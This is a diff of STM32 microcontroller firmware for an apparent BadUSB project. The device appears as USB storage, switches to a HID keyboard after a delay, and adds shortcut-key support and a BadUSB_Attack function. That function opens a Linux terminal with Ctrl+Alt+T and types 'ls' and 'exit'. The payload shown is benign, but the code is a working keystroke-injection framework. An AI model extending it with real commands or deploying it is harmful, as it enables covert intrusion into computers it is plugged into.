@@ -86,10 +86,13 @@
  *| 5. map[ASCII] = 0x(A)(B/B+8)                                               |
  *| 6. map[0]-[127] is standard mapping from ASCII to its descriptor           |
  *|    map[128]-[]  is Customize keyboard shortcuts to its descriptor:         |
- *|        (1).map[128]:Capslock's descriptor                                  |
- *|        (2).map[129]:Backspace's descriptor                                 |
+ *|        (1).map[128]: Capslock's descriptor                                 |
+ *|        (2).map[129]: Backspace's descriptor                                |
+ *|        (3).map[130]: Ctrl's descriptor                                     |
+ *|        (4).map[131]: Alt's descriptor                                      |
+ *|        Linux start Terminal(Ctrl + Alt + T)                                |
  *|____________________________________________________________________________|
-  uint8_t map[129]={
+  uint8_t map[132]={
   		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
   		0x00, 0x00, 0x64, 0x00, 0x00, 0x64, 0x00, 0x00,
   		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
@@ -108,6 +111,8 @@
   		0x47, 0x50, 0x51, 0x7b, 0x7d, 0x7c, 0x89, 0xb0,
   		0x85,     //ASCII[128]:Capslock
   		0x66,     //ASCII[129]:Backspace
+  		0x00,     //ASCII[130]:Ctrl
+  		0x02,     //ASCII[131]:Alt
   };
  *-----------------------------------------------------------------------------
  **Following are the descriptor set in Function:
@@ -241,7 +246,7 @@ void SystemClock_Config(void);
 
 /* Private user code ---------------------------------------------------------*/
 /* USER CODE BEGIN 0 */
-#define MapLen 130
+#define MapLen 132
 //You can adjust StrokeSlot to ensure the the correctness and stability of the output
 #define StrokeSlot 35
 #define PlugSlot 50
@@ -266,7 +271,7 @@ uint8_t recv_buffer[USBD_CUSTOMHID_INREPORT_BUF_SIZE];
 0x27, 0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36,\
 0x37, 0x40, 0x41, 0x42, 0x43, 0x44, 0x45, 0x46,\
 0x47, 0x50, 0x51, 0x7b, 0x7d, 0x7c, 0x89, 0xb0,\
-0x85, 0x66, \
+0x85, 0x66, 0x00, 0x02, \
 }\
 
 int InterruptFlag = 0;
@@ -278,15 +283,18 @@ void SimulateUSB_unplug();
 void SimulateUSB_plugin();
 void SwitchToHID();
 void SwitchToMSC();
-void Get_Descriptor(uint8_t ascii);
+void Get_Single_Descriptor(uint8_t ascii);
+void Get_Multi_Descriptor(uint8_t *array, int num);
 void SimulateKeyPress(uint8_t ascii);
 void SimulateKeyRelease();
 void SimulateKeyStroke(uint8_t ascii);
+void SimulateShortcutKey(uint8_t *array, int num);
 void SimulateKeyStrokes(char *str, int len, int *cntNow);
 void PrintRecvBuf(uint8_t Recv_Buf[USBD_CUSTOMHID_INREPORT_BUF_SIZE]);
 void InitKeyboardStatus();
 void Convert2CapsMap(uint8_t LowerCaseMap[MapLen]);
 void InterruptTrap(int *InterruptFlag);
+void BadUSB_Attack(int type);
 
 /* USER CODE END 0 */
 
@@ -325,9 +333,7 @@ int main(void)
   isMSC = 1;
   MX_USB_DEVICE_Init_MSC();
 
-  uint8_t Map[MapLen] = Map_Init;
   memset(sent_buffer, 0x00, sizeof(uint8_t)*USBD_CUSTOMHID_OUTREPORT_BUF_SIZE);
-  Convert2CapsMap(Map);
 
   flag = 1;
   /* USER CODE END 2 */
@@ -338,13 +344,13 @@ int main(void)
 	  InterruptTrap(&InterruptFlag);
 
 	  if(flag == 1){
-		  HAL_Delay(30000);
+		  HAL_Delay(10000); //random slot to switch HID
 		  SwitchToHID();
-		  char AttackStr[256];
-		  strcpy(AttackStr, "!@#$%^&*()_+1234567890~`{}|:\"<>?[];',./ashdahskdhasjdeuwhuASDJDHJAJKDHBSXAHE\n");
-		  SimulateKeyStrokes(AttackStr, strlen(AttackStr), &PrintCnt);
-		  flag = 0;
+		  HAL_Delay(10000); //test Device Manager
+		  //Attack begin
+		  BadUSB_Attack(0);
 
+		  flag = 0;
 		  SwitchToMSC();
 	  }
 
@@ -443,18 +449,31 @@ void SwitchToMSC(){
 	HAL_Delay(PlugSlot*10);
 }
 
-void Get_Descriptor(uint8_t ascii){
+void Get_Single_Descriptor(uint8_t ascii){
 	memset(sent_buffer, 0x00, sizeof(uint8_t)*USBD_CUSTOMHID_OUTREPORT_BUF_SIZE);
 	uint8_t Map[MapLen] = Map_Init;
+	Convert2CapsMap(Map);
 	uint8_t pos = Map[ascii];
 	sent_buffer[(uint8_t)(pos>>4)] |= (1<<((uint8_t)(pos&0x07)));
 	if((pos&0x08) == 8)
 		sent_buffer[0] |= 0x02;
 }
 
+void Get_Multi_Descriptor(uint8_t *array, int num){
+	memset(sent_buffer, 0x00, sizeof(uint8_t)*USBD_CUSTOMHID_OUTREPORT_BUF_SIZE);
+	uint8_t Map[MapLen] = Map_Init;
+	Convert2CapsMap(Map);
+	for(int i = 0; i < num; i++){
+		uint8_t pos = Map[array[i]];
+		sent_buffer[(uint8_t)(pos>>4)] |= (1<<((uint8_t)(pos&0x07)));
+		if((pos&0x08) == 8)
+			sent_buffer[0] |= 0x02;
+	}
+}
+
 void SimulateKeyPress(uint8_t ascii){
     //get key:ascii Descriptor
-    Get_Descriptor(ascii);
+    Get_Single_Descriptor(ascii);
     //Ensure that this instruction is executed in uppercase environment.
 //    while((recv_buffer[0]&0x02) != 0x02)
 //    	HAL_Delay(1);
@@ -476,6 +495,14 @@ void SimulateKeyStroke(uint8_t ascii){
     HAL_Delay(StrokeSlot); //Wait StrokeSlot time
     SimulateKeyRelease();
     HAL_Delay(StrokeSlot); //Wait StrokeSlot time
+}
+
+void SimulateShortcutKey(uint8_t *array, int num){
+	Get_Multi_Descriptor(array, num);
+	USBD_CUSTOM_HID_SendReport(&hUsbDeviceFS, sent_buffer, USBD_CUSTOMHID_OUTREPORT_BUF_SIZE);
+	HAL_Delay(StrokeSlot); //Wait StrokeSlot time
+	SimulateKeyRelease();
+	HAL_Delay(StrokeSlot); //Wait StrokeSlot time
 }
 
 void SimulateKeyStrokes(char *str, int len, int *cntNow){
@@ -531,11 +558,31 @@ void InterruptTrap(int *InterruptFlag){
 	}
 }
 
+void BadUSB_Attack(int type){//type = 0:Linux; type = 1:windows.
+	if(type == 0){
+		uint8_t StartLinuxTerminal[3] = {130, 131, 'T'};
+		char AttackStr[256];
+
+		SimulateShortcutKey(StartLinuxTerminal, 3);
+		HAL_Delay(1000);   //wait to observe
+		strcpy(AttackStr, "ls\n\nexit\n\n");
+		SimulateKeyStrokes(AttackStr, strlen(AttackStr), &PrintCnt);
+//		HAL_Delay(6000);   //wait to observe
+//		strcpy(AttackStr, "exit\n\n");
+//		SimulateKeyStrokes(AttackStr, strlen(AttackStr), &PrintCnt);
+	}else if(type == 1){
+	}else{    //test
+		char AttackStr[256];
+		strcpy(AttackStr, "!@#$%^&*()_+1234567890~`{}|:\"<>?[];',./ashdahskdhasjdeuwhuASDJDHJAJKDHBSXAHE\n");
+		SimulateKeyStrokes(AttackStr, strlen(AttackStr), &PrintCnt);
+	}
+}
+
 void HAL_TIM_PeriodElapsedCallback(TIM_HandleTypeDef *htim){
 	if(htim == &htim2){
 		if(InterruptCnt == 0){
 			//Simulate press operation
-			Get_Descriptor(128);
+			Get_Single_Descriptor(128);
 			USBD_CUSTOM_HID_SendReport(&hUsbDeviceFS, sent_buffer, USBD_CUSTOMHID_OUTREPORT_BUF_SIZE);
 //			HAL_GPIO_WritePin(GPIOB, GPIO_PIN_3, GPIO_PIN_SET);
 		}else if(InterruptCnt == 1){
